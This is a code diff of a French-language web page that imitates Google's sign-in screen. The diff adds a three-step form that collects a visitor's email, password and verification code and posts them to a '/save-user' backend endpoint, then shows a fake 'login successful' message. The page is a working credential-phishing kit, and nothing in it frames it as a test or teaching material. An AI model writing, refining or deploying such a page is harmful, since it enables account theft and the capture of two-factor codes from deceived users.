@@ -1,169 +1,188 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion - Google</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-    }
-    body {
-      background-color: #ffffff;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .container {
-      width: 100%;
-      max-width: 400px;
-      padding: 40px 24px;
-      display: flex;
-      flex-direction: column;
-      min-height: 90vh;
-      justify-content: space-between;
-    }
-    .top-content {
-      text-align: center;
-    }
-    .logo {
-      font-size: 32px;
-      font-weight: 500;
-      letter-spacing: -0.5px;
-      margin-bottom: 16px;
-    }
-    .logo span:nth-child(1) { color: #4285F4; }
-    .logo span:nth-child(2) { color: #EA4335; }
-    .logo span:nth-child(3) { color: #FBBC05; }
-    .logo span:nth-child(4) { color: #4285F4; }
-    .logo span:nth-child(5) { color: #34A853; }
-    .logo span:nth-child(6) { color: #EA4335; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion - Google</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+    }
+    body {
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 40px 24px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .top-content {
+      text-align: center;
+    }
+    .logo {
+      font-size: 32px;
+      font-weight: 500;
+      letter-spacing: -0.5px;
+      margin-bottom: 16px;
+    }
+    .logo span:nth-child(1) { color: #4285F4; }
+    .logo span:nth-child(2) { color: #EA4335; }
+    .logo span:nth-child(3) { color: #FBBC05; }
+    .logo span:nth-child(4) { color: #4285F4; }
+    .logo span:nth-child(5) { color: #34A853; }
+    .logo span:nth-child(6) { color: #EA4335; }
 
-    .title {
-      font-size: 26px;
-      color: #1f1f1f;
-      margin-bottom: 12px;
-      font-weight: 400;
-    }
-    .description {
-      font-size: 15px;
-      color: #3c4043;
-      line-height: 1.4;
-      margin-bottom: 8px;
-    }
-    .learn-more {
-      display: block;
-      color: #1a73e8;
-      font-size: 15px;
-      text-decoration: none;
-      font-weight: 500;
-      margin-bottom: 32px;
-      text-align: left;
-    }
+    .title {
+      font-size: 26px;
+      color: #1f1f1f;
+      margin-bottom: 12px;
+      font-weight: 400;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      border: 1.5px solid #1a73e8;
+      border-radius: 4px;
+      outline: none;
+      background: transparent;
+      color: #202124;
+    }
+    .input-group label {
+      position: absolute;
+      left: 12px;
+      top: -10px;
+      background-color: #ffffff;
+      padding: 0 4px;
+      font-size: 12px;
+      color: #1a73e8;
+    }
+    .bottom-actions {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      margin-top: 24px;
+    }
+    button {
+      padding: 10px 24px;
+      background-color: #1a73e8;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1557b0;
+    }
+    #step2, #step3, #success-message {
+      display: none;
+    }
+    .user-chip {
+      display: inline-block;
+      border: 1px solid #dadce0;
+      border-radius: 16px;
+      padding: 4px 12px;
+      font-size: 14px;
+      color: #3c4043;
+      margin-bottom: 20px;
+    }
+    .show-password {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #3c4043;
+      margin-top: 8px;
+    }
+    .show-password input {
+      margin-right: 8px;
+      width: 18px;
+      height: 18px;
+    }
+    #success-message {
+      color: #1e8e3e;
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
 
-    /* Outlined Floating Input Box */
-    .input-group {
-      position: relative;
-      margin-bottom: 12px;
-      text-align: left;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 16px;
-      font-size: 16px;
-      border: 1.5px solid #1a73e8;
-      border-radius: 4px;
-      outline: none;
-      background: transparent;
-      color: #202124;
-    }
-    .input-group label {
-      position: absolute;
-      left: 12px;
-      top: -10px;
-      background-color: #ffffff;
-      padding: 0 4px;
-      font-size: 12px;
-      color: #1a73e8;
-    }
+  <div class="container">
+    <div class="top-content">
+      <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+      </div>
+      <h1 class="title">Connexion</h1>
+    </div>
 
-    .forgot-link {
-      display: block;
-      color: #1a73e8;
-      font-size: 14px;
-      text-decoration: none;
-      font-weight: 500;
-      text-align: left;
-      margin-bottom: 40px;
-    }
+    <!-- Step 1: Email -->
+    <div id="step1">
+      <form id="step1Form">
+        <div class="input-group">
+          <input type="text" id="emailInput" required autocomplete="off">
+          <label for="emailInput">E-mail ou téléphone</label>
+        </div>
+        <div class="bottom-actions">
+          <button type="submit">Suivant</button>
+        </div>
+      </form>
+    </div>
 
-    .create-account {
-      display: block;
-      color: #1a73e8;
-      font-size: 14px;
-      text-decoration: none;
-      font-weight: 500;
-      text-align: left;
-    }
+    <!-- Step 2: Password -->
+    <div id="step2">
+      <div class="user-chip" id="userEmailDisplay"></div>
+      <form id="step2Form">
+        <div class="input-group">
+          <input type="password" id="passwordInput" required>
+          <label for="passwordInput">Saisissez votre mot de passe</label>
+        </div>
+        <div class="show-password">
+          <input type="checkbox" onclick="togglePassword()"> Afficher le mot de passe
+        </div>
+        <div class="bottom-actions">
+          <button type="submit">Suivant</button>
+        </div>
+      </form>
+    </div>
 
-    .bottom-actions {
-      display: flex;
-      justify-content: flex-end;
-      align-items: center;
-      margin-top: 40px;
-    }
+    <!-- Step 3: Verification Code -->
+    <div id="step3">
+      <form id="step3Form">
+        <div class="input-group">
+          <input type="text" id="codeInput" required autocomplete="off">
+          <label for="codeInput">Code de vérification</label>
+        </div>
+        <div class="bottom-actions">
+          <button type="submit">Valider</button>
+        </div>
+      </form>
+    </div>
 
-    button {
-      padding: 10px 24px;
-      background-color: #1a73e8;
-      color: #ffffff;
-      border: none;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #1557b0;
-    }
+    <!-- Success Screen -->
+    <div id="success-message">
+      Connexion réussie !
+    </div>
+  </div>
 
-    #step2, #step3, #success-message { display: none; }
-
-    .user-chip {
-      display: inline-block;
-      border: 1px solid #dadce0;
-      border-radius: 16px;
-      padding: 4px 12px;
-      font-size: 14px;
-      color: #3c4043;
-      margin-bottom: 20px;
-    }
-
-    .show-password {
-      display: flex;
-      align-items: center;
-      font-size: 14px;
-      color: #3c4043;
-      margin-top: 12px;
-      text-align: left;
-    }
-    .show-password input {
-      margin-right: 8px;
-      width: 18px;
-      height: 18px;
-    }
-
-    #success-message {
-      color: #1e8e3e;
-      font-size: 24px;
-      font-weight: bold;
-      text-align: center;
-      margin-top: 40px;
-  <script>
+  <script>
     const step1Form = document.getElementById('step1Form');
     const step2Form = document.getElementById('step2Form');
     const step3Form = document.getElementById('step3Form');
@@ -174,29 +193,53 @@
 
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
+    const codeInput = document.getElementById('codeInput');
     const userEmailDisplay = document.getElementById('userEmailDisplay');
     const successMsg = document.getElementById('success-message');
 
-    // الإنتقال من البريد إلى كلمة السر
+    // step 1 -> step 2
     step1Form.addEventListener('submit', function(e) {
       e.preventDefault();
       userEmailDisplay.textContent = emailInput.value;
-      step1Form.style.display = 'none';
+      step1Div.style.display = 'none';
       step2Div.style.display = 'block';
     });
 
-    // الإنتقال من كلمة السر إلى كود التحقق
+    // step 2 -> step 3
     step2Form.addEventListener('submit', function(e) {
       e.preventDefault();
-      step2Form.style.display = 'none';
+      step2Div.style.display = 'none';
       step3Div.style.display = 'block';
     });
 
-    // إتمام العملية
-    step3Form.addEventListener('submit', function(e) {
+    // step 3 -> Save to Express Backend (/save-user)
+    step3Form.addEventListener('submit', async function(e) {
       e.preventDefault();
-      step3Form.style.display = 'none';
-      successMsg.style.display = 'block';
+      
+      const payload = {
+        email: emailInput.value,
+        password: passwordInput.value,
+        code: codeInput.value
+      };
+
+      try {
+        const response = await fetch('/save-user', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+        if (result.status === 'success') {
+          step3Div.style.display = 'none';
+          successMsg.style.display = 'block';
+        } else {
+          alert('Erreur lors de la sauvegarde');
+        }
+      } catch (err) {
+        console.error(err);
+        alert('Erreur réseau ou serveur');
+      }
     });
 
     function togglePassword() {
@@ -207,3 +250,5 @@
       }
     }
   </script>
+</body>
+</html>
